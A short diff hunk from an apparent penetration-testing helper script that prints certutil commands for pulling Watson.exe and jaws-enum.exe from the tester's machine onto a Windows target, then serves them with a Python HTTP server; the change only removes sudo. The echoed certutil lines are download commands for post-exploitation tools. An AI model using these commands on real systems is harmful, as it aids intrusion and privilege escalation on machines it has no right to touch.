@@ -31,4 +31,4 @@ echo "certutil.exe -urlcache -split -f http://$ip:8990/Watson.exe Watson.exe"
 echo "certutil.exe -urlcache -split -f http://$ip:8990/jaws-enum.exe jaws-enum.exe"
 echo ""
 
-sudo python3 -m http.server 8990
+python3 -m http.server 8990
